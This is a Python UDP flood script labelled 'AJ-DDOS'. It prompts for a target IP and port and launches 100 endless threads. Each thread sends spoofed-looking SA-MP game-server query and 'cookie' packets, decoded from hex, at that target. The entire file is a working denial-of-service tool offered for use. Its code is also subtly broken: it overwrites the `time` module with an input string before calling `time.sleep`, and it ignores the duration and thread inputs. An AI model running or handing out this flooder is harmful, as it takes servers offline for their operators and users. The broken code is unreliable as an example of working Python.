import argparse
import socket
import struct
import codecs,sys
import threading
import random
import time
import os

os.system("clear")
print
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : AJDOS\033[0m")
print("\033[33mGithub 	       : https://github.com/AJDOS/\033[0m")
print("\033[32m================================================================\033[0m")
print
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
time = str(input(" Time:"))
thread = int(input(" Thread:"))
orgip =ip

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]
                     


class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                aj = Pacotes[random.randrange(0,3)]
                samp = Pacotes[random.randrange(0,3)]
                tanga = Pacotes[random.randrange(0,3)]
                attack = Pacotes[random.randrange(0,3)]
                udp = Pacotes[random.randrange(0,3)]
                tcp = Pacotes[random.randrange(0,3)]
                syn = Pacotes[random.randrange(0,3)]
                tp = Pacotes[random.randrange(0,3)]
                cold = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(aj, (ip, int(port)))
                sock.sendto(samp, (ip, int(port)))
                sock.sendto(tanga, (ip, int(port)))
                sock.sendto(attack, (ip, int(port)))
                sock.sendto(udp, (ip, int(port)))
                sock.sendto(tcp, (ip, int(port)))
                sock.sendto(syn, (ip, int(port)))
                sock.sendto(tp, (ip, int(port)))
                sock.sendto(cold, (ip, int(port)))
                print("[AJ-DDOS] Attacking ip: %s Port: %s"%(orgip,port))
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))    
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
